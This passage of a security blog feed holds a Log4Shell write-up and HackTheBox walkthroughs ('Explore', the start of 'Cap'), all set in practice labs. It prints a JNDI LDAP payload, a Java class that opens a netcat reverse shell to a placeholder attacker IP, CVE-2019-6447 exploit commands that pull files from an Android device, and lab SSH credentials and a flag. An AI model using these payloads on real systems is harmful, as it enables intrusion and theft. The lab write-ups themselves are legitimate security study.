&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;${jndi:ldap://ATTACKER-SERVER/x}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The exploit can be broken into:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;log4j parses the command and sends a ldap request to ATTACKER-SERVER via jndi.&lt;/li&gt;
&lt;li&gt;The first ATTACKER-SERVER then points to another attacker controlled server which is hosting a malicious Java code.&lt;/li&gt;
&lt;li&gt;The victim requests the malicious code and executes it, leading to RCE.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The process can be visualized with the following figure by &lt;a href=&#34;https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/&#34;&gt;GovCERT&lt;/a&gt;
&lt;img src=&#34;https://somesh-banerjee.github.io/blogs/blogs/log4j/2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;The vulnerability was first reported to Apache on 24th November 2021 and publicly announced on 9th December 2021. Many large organizations are affected by this CVE which includes Amazon, Google, Tencent and others. You can find the list &lt;a href=&#34;https://github.com/YfryTchsGD/Log4jAttackSurface&#34;&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;proof-of-concept&#34;&gt;Proof of Concept&lt;/h1&gt;
&lt;p&gt;We will be using the TryHackMe Solr room for this. The victim machine is running Apache Solr 8.11.0, which has this vulnerability. First I am creating a ldap Reference server. The Reference server will point to another server which will serve the malicious java code. Both the server are running on same machines but different ports.&lt;/p&gt;
&lt;p&gt;For ldap reference server, we will use &lt;a href=&#34;https://github.com/mbechler/marshalsec&#34;&gt;marshalsec&lt;/a&gt;. It will serve on port 1389 and point to port 8000. Here is the screenshot
&lt;img src=&#34;https://somesh-banerjee.github.io/blogs/blogs/log4j/3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now in port 8000, the compiled class of the following java code is served.
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Exploit&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
            java&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Runtime&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getRuntime&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;exec&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Exception e&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
            e&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;printStackTrace&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
The code just sends a reverse shell to the attacker.&lt;/p&gt;
&lt;p&gt;Now as we are interacting with the victim server using curl and passing the exploit as a parameter, it is getting executed and we are getting the reverse shell from the server.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://somesh-banerjee.github.io/blogs/blogs/log4j/4.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;The CVE have been patched in log4j update by disabling jndi by default. &lt;a href=&#34;https://log4shell.huntress.com/&#34;&gt;HuntresLabs scanner&lt;/a&gt; can be used to check for Log4Shell vulnerability in your app.&lt;/p&gt;
&lt;p&gt;Some of the resources I used to learn about this:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java&#34;&gt;https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation&#34;&gt;https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;TryHackMe - Solar, exploiting log4j Room&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
    <item>
      <title>Explore Machine</title>
      <link>https://somesh-banerjee.github.io/blogs/posts/explore/</link>
      <pubDate>Fri, 15 Oct 2021 13:26:55 +0530</pubDate>
      
      <guid>https://somesh-banerjee.github.io/blogs/posts/explore/</guid>
      <description>OS: Android
Points: 20
Difficulty: Easy
ip = 10.10.10.247
nmap scan PORT STATE SERVICE VERSION 2222/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: |_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA) 4501/tcp closed unknown 5555/tcp filtered freeciv 7135/tcp closed unknown 8705/tcp closed unknown 17330/tcp closed unknown 17338/tcp closed unknown 20873/tcp closed unknown 25959/tcp closed unknown 32381/tcp closed unknown 33431/tcp closed unknown 36745/tcp open unknown | fingerprint-strings: | GenericLines: | HTTP/1.</description>
      <content>&lt;p&gt;OS: Android&lt;br&gt;
Points: 20&lt;br&gt;
Difficulty: Easy&lt;/p&gt;
&lt;p&gt;ip = 10.10.10.247&lt;/p&gt;
&lt;h4 id=&#34;nmap-scan&#34;&gt;nmap scan&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PORT      STATE    SERVICE VERSION
2222/tcp  open     ssh     (protocol 2.0)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey:
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
4501/tcp  closed   unknown
5555/tcp  filtered freeciv
7135/tcp  closed   unknown
8705/tcp  closed   unknown
17330/tcp closed   unknown
17338/tcp closed   unknown
20873/tcp closed   unknown
25959/tcp closed   unknown
32381/tcp closed   unknown
33431/tcp closed   unknown
36745/tcp open     unknown
| fingerprint-strings:
|   GenericLines:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 30 Jul 2021 04:28:38 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|   GetRequest:
|     HTTP/1.1 412 Precondition Failed
|     Date: Fri, 30 Jul 2021 04:28:38 GMT
|     Content-Length: 0
|   HTTPOptions:
|     HTTP/1.0 501 Not Implemented
|     Date: Fri, 30 Jul 2021 04:28:44 GMT
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 30 Jul 2021 04:29:02 GMT
|     Content-Length: 26
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 30 Jul 2021 04:28:44 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 30 Jul 2021 04:29:02 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|     ?G???,???`~?
|     ??{????w????&amp;lt;=?o?
|   TLSSessionReq:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 30 Jul 2021 04:29:03 GMT
|     Content-Length: 71
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|     ??random1random2random3random4
|   TerminalServerCookie:
|     HTTP/1.0 400 Bad Request
|     Date: Fri, 30 Jul 2021 04:29:03 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|_    Cookie: mstshash=nmap
37712/tcp closed   unknown
38224/tcp closed   unknown
40415/tcp closed   unknown
42844/tcp closed   unknown
49627/tcp closed   unknown
51958/tcp closed   unknown
52854/tcp closed   unknown
55744/tcp closed   unknown
56823/tcp closed   unknown
59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn&#39;t have a title (text/plain).
60540/tcp closed   unknown
60600/tcp closed   unknown
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.91%I=7%D=7/30%Time=61037FF2%P=x86_64-pc-linux-gnu%r(NU
SF:LL,24,&amp;quot;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&amp;quot;);
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port36745-TCP:V=7.91%I=7%D=7/30%Time=61037FF2%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,AA,&amp;quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x20
SF:30\x20Jul\x202021\x2004:28:38\x20GMT\r\nContent-Length:\x2022\r\nConten
SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\
SF:r\nInvalid\x20request\x20line:\x20&amp;quot;)%r(GetRequest,5C,&amp;quot;HTTP/1\.1\x20412\
SF:x20Precondition\x20Failed\r\nDate:\x20Fri,\x2030\x20Jul\x202021\x2004:2
SF:8:38\x20GMT\r\nContent-Length:\x200\r\n\r\n&amp;quot;)%r(HTTPOptions,B5,&amp;quot;HTTP/1\
SF:.0\x20501\x20Not\x20Implemented\r\nDate:\x20Fri,\x2030\x20Jul\x202021\x
SF:2004:28:44\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/pla
SF:in;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x2
SF:0supported:\x20OPTIONS&amp;quot;)%r(RTSPRequest,BB,&amp;quot;HTTP/1\.0\x20400\x20Bad\x20R
SF:equest\r\nDate:\x20Fri,\x2030\x20Jul\x202021\x2004:28:44\x20GMT\r\nCont
SF:ent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r
SF:\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version:
SF:\x20\x20RTSP/1\.0&amp;quot;)%r(Help,AE,&amp;quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDa
SF:te:\x20Fri,\x2030\x20Jul\x202021\x2004:29:02\x20GMT\r\nContent-Length:\
SF:x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection
SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP&amp;quot;)%r(SSLSessionReq
SF:,DD,&amp;quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x2030\x20Jul\x
SF:202021\x2004:29:02\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x20
SF:text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid\
SF:x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\?
SF:\0\?\?{\?\?\?\?w\?\?\?\?&amp;lt;=\?o\?\x10n\0\0\(\0\x16\0\x13\0&amp;quot;)%r(TerminalSe
SF:rverCookie,CA,&amp;quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Fri,\x203
SF:0\x20Jul\x202021\x2004:29:03\x20GMT\r\nContent-Length:\x2054\r\nContent
SF:-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r
SF:\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20msts
SF:hash=nmap&amp;quot;)%r(TLSSessionReq,DB,&amp;quot;HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
SF:ate:\x20Fri,\x2030\x20Jul\x202021\x2004:29:03\x20GMT\r\nContent-Length:
SF:\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\0
SF:e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;user&#34;&gt;User&lt;/h2&gt;
&lt;p&gt;There is a http server running on port &lt;code&gt;57999&lt;/code&gt;. Opening the page &lt;code&gt;http://10.10.10.247:59777/&lt;/code&gt; on browser
gives the output&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;FORBIDDEN: No directory listing.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Using gobuster I tried to find other directories.&lt;code&gt;gobuster -u http://10.10.10.247:59777 -w /usr/share/wordlists/dirb/big.txt dir&lt;/code&gt;, output:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/acct                 (Status: 301) [Size: 65] [--&amp;gt; /acct/]
/bin                  (Status: 301) [Size: 63] [--&amp;gt; /bin/]
/cache                (Status: 301) [Size: 67] [--&amp;gt; /cache/]
/config               (Status: 301) [Size: 69] [--&amp;gt; /config/]
/d                    (Status: 301) [Size: 59] [--&amp;gt; /d/]
/data                 (Status: 301) [Size: 65] [--&amp;gt; /data/]
/dev                  (Status: 301) [Size: 63] [--&amp;gt; /dev/]
/etc                  (Status: 301) [Size: 63] [--&amp;gt; /etc/]
/init                 (Status: 403) [Size: 31]
/lib                  (Status: 301) [Size: 63] [--&amp;gt; /lib/]
/mnt                  (Status: 301) [Size: 63] [--&amp;gt; /mnt/]
/oem                  (Status: 301) [Size: 63] [--&amp;gt; /oem/]
/proc                 (Status: 301) [Size: 65] [--&amp;gt; /proc/]
/product              (Status: 301) [Size: 71] [--&amp;gt; /product/]
/sbin                 (Status: 301) [Size: 65] [--&amp;gt; /sbin/]
/storage              (Status: 301) [Size: 71] [--&amp;gt; /storage/]
/sys                  (Status: 301) [Size: 63] [--&amp;gt; /sys/]
/system               (Status: 301) [Size: 69] [--&amp;gt; /system/]
/vendor               (Status: 301) [Size: 69] [--&amp;gt; /vendor/]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In all directories listing is forbidden. I tried to get any credentials. But &lt;code&gt;/etc/ssh&lt;/code&gt; and  &lt;code&gt;/etc/passwd&lt;/code&gt; are not available. For &lt;code&gt;/init&lt;/code&gt; the reading of the file was forbidden. &lt;code&gt;/etc/hosts&lt;/code&gt; was available and while going to that file &lt;code&gt;http://10.10.10.247:59777/etc/hosts&lt;/code&gt;, it was getting downloaded.&lt;/p&gt;
&lt;p&gt;So there are files in the machine and some which are readible to us. We have to &lt;strong&gt;explore files&lt;/strong&gt; in the machine. Searching for &amp;ldquo;explore file android exploits&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;The first result is CVE-2019-6447. It will list all the files in android server and can get it. The port in the exploit is set to &lt;code&gt;59777&lt;/code&gt;. Lets see exploits help&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;┌──(kali㉿kali)-[~/HTB/Explore]
└─$ python3 50070 help
USAGE 50070 &amp;lt;command&amp;gt; &amp;lt;IP&amp;gt; [file to download]
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;┌──(kali㉿kali)-[~/HTB/Explore]
└─$ python3 50070 help 10.10.10.247                                                                            1 ⨯
[-] WRONG COMMAND!
Available commands :
  listFiles         : List all Files.
  listPics          : List all Pictures.
  listVideos        : List all videos.
  listAudios        : List all audios.
  listApps          : List Applications installed.
  listAppsSystem    : List System apps.
  listAppsPhone     : List Communication related apps.
  listAppsSdcard    : List apps on the SDCard.
  listAppsAll       : List all Application.
  getFile           : Download a file.
  getDeviceInfo     : Get device info.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I used all the commands available and see if I get anything useful.
Using &lt;code&gt;listPics&lt;/code&gt; I get a image of credentials.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;┌──(kali㉿kali)-[~/HTB/Explore]
└─$ python3 50070 listPics 10.10.10.247                                                                        1 ⨯
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;name : concept.jpg
time : 4/21/21 02:38:08 AM
location : /storage/emulated/0/DCIM/concept.jpg
size : 135.33 KB (138,573 Bytes)
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;name : anc.png
time : 4/21/21 02:37:50 AM
location : /storage/emulated/0/DCIM/anc.png
size : 6.24 KB (6,392 Bytes)
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;name : creds.jpg
time : 4/21/21 02:38:18 AM
location : /storage/emulated/0/DCIM/creds.jpg
size : 1.14 MB (1,200,401 Bytes)
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;name : 224_anc.png
time : 4/21/21 02:37:21 AM
location : /storage/emulated/0/DCIM/224_anc.png
size : 124.88 KB (127,876 Bytes)
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;┌──(kali㉿kali)-[~/HTB/Explore]
└─$ python3 50070 getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;[+] Downloading file...
[+] Done. Saved as `out.dat`.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The image contains:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;kristi
Kr1sT!5h@Rp3xPl0r3!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is the credentials for ssh. Connecting through ssh&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;ssh kristi@10.10.10.247 -p 2222          
The authenticity of host &amp;#39;[10.10.10.247]:2222 ([10.10.10.247]:2222)&amp;#39; can&amp;#39;t be established.
RSA key fingerprint is SHA256:3mNL574rJyHCOGm1e7Upx4NHXMg/YnJJzq+jXhdQQxI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added &amp;#39;[10.10.10.247]:2222&amp;#39; (RSA) to the list of known hosts.
Password authentication
Password:
:/ $ ls
acct                   init.superuser.rc       sbin
bin                    init.usb.configfs.rc    sdcard
bugreports             init.usb.rc             sepolicy
cache                  init.zygote32.rc        storage
charger                init.zygote64_32.rc     sys
config                 lib                     system
d                      mnt                     ueventd.android_x86_64.rc
data                   odm                     ueventd.rc
default.prop           oem                     vendor
dev                    plat_file_contexts      vendor_file_contexts
etc                    plat_hwservice_contexts vendor_hwservice_contexts
fstab.android_x86_64   plat_property_contexts  vendor_property_contexts
init                   plat_seapp_contexts     vendor_seapp_contexts
init.android_x86_64.rc plat_service_contexts   vendor_service_contexts
init.environ.rc        proc                    vndservice_contexts
init.rc                product
:/ $ whoami
u0_a76
:/ $ cd s
sbin/     sdcard/   sepolicy  storage/  sys/      system/
:/ $ cd sdcard/
:/sdcard $ ls
Alarms  DCIM     Movies Notifications Podcasts  backups   user.txt
Android Download Music  Pictures      Ringtones dianxinos
:/sdcard $ ca
cal             cameraserver    case            cat             catv
:/sdcard $ cat user.txt
f32017174c7c7e8f50c6da52891ae250
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
    </item>
    
    <item>
      <title>Cap</title>
      <link>https://somesh-banerjee.github.io/blogs/posts/cap/</link>
      <pubDate>Sun, 03 Oct 2021 13:26:55 +0530</pubDate>
      
      <guid>https://somesh-banerjee.github.io/blogs/posts/cap/</guid>
      <description>OS: Linux
Points: 20
Difficulty: Easy
ip=10.10.10.245
User solution The first thing is to do the nmap scan.
┌──(kali㉿kali)-[~/HTB/Cap] └─$ nmap -sC -sV -p$ports $ip -oA nmap_result Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 11:08 EDT Nmap scan report for 10.10.10.245 Host is up (0.090s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA) | 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA) |_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519) 80/tcp open http gunicorn | fingerprint-strings: | FourOhFourRequest: | HTTP/1.</description>
      <content>&lt;p&gt;OS: Linux&lt;br&gt;
Points: 20&lt;br&gt;
Difficulty: Easy&lt;/p&gt;
&lt;p&gt;ip=10.10.10.245&lt;/p&gt;
&lt;h2 id=&#34;user-solution&#34;&gt;User solution&lt;/h2&gt;
&lt;p&gt;The first thing is to do the nmap scan.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;┌──(kali㉿kali)-[~/HTB/Cap]
└─$ nmap -sC -sV -p$ports $ip -oA nmap_result
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 11:08 EDT
Nmap scan report for 10.10.10.245
Host is up (0.090s latency).
&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Sat, 26 Jun 2021 15:08:48 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     &amp;lt;!DOCTYPE HTML PUBLIC &amp;#34;-//W3C//DTD HTML 3.2 Final//EN&amp;#34;&amp;gt;
|     &amp;lt;title&amp;gt;404 Not Found&amp;lt;/title&amp;gt;
|     &amp;lt;h1&amp;gt;Not Found&amp;lt;/h1&amp;gt;
|     &amp;lt;p&amp;gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&amp;lt;/p&amp;gt;
|   GetRequest:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sat, 26 Jun 2021 15:08:41 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     &amp;lt;!DOCTYPE html&amp;gt;
|     &amp;lt;html class=&amp;#34;no-js&amp;#34; lang=&amp;#34;en&amp;#34;&amp;gt;
|     &amp;lt;head&amp;gt;
|     &amp;lt;meta charset=&amp;#34;utf-8&amp;#34;&amp;gt;
|     &amp;lt;meta http-equiv=&amp;#34;x-ua-compatible&amp;#34; content=&amp;#34;ie=edge&amp;#34;&amp;gt;
|     &amp;lt;title&amp;gt;Security Dashboard&amp;lt;/title&amp;gt;
|     &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1&amp;#34;&amp;gt;
|     &amp;lt;link rel=&amp;#34;shortcut icon&amp;#34; type=&amp;#34;image/png&amp;#34; href=&amp;#34;/static/images/icon/favicon.ico&amp;#34;&amp;gt;
|     &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;/static/css/bootstrap.min.css&amp;#34;&amp;gt;
|     &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;/static/css/font-awesome.min.css&amp;#34;&amp;gt;
|     &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;/static/css/themify-icons.css&amp;#34;&amp;gt;
|     &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;/static/css/metisMenu.css&amp;#34;&amp;gt;
|     &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;/static/css/owl.carousel.min.css&amp;#34;&amp;gt;
|     &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;/static/css/slicknav.min.css&amp;#34;&amp;gt;
|     &amp;lt;!-- amchar
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sat, 26 Jun 2021 15:08:41 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, OPTIONS, GET
|     Content-Length: 0
|   RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     &amp;lt;html&amp;gt;
|     &amp;lt;head&amp;gt;
|     &amp;lt;title&amp;gt;Bad Request&amp;lt;/title&amp;gt;
|     &amp;lt;/head&amp;gt;
|     &amp;lt;body&amp;gt;
|     &amp;lt;h1&amp;gt;&amp;lt;p&amp;gt;Bad Request&amp;lt;/p&amp;gt;&amp;lt;/h1&amp;gt;
|     Invalid HTTP Version &amp;amp;#x27;Invalid HTTP Version: &amp;amp;#x27;RTSP/1.0&amp;amp;#x27;&amp;amp;#x27;
|     &amp;lt;/body&amp;gt;
|_    &amp;lt;/html&amp;gt;
|_http-server-header: gunicorn
|_http-title: Security Dashboard
